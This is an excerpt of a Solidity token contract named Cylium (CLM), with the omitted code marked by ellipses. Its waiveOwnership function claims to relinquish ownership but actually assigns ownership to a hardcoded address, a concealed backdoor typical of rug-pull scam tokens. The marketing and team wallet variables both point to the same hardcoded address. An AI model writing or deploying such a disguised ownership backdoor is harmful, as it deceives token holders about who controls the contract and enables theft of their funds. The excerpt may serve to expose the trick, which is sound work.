...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x8186dD5922a4DD6605082295c04D5811b8e28a22);
    }
...
contract Cylium is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Cylium";
    string private _symbol = "CLM";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x2bB832a0F83448E105c24f20973a2F3b2f8fa1dA);
    address payable public teamWalletAddress = payable(0x2bB832a0F83448E105c24f20973a2F3b2f8fa1dA);
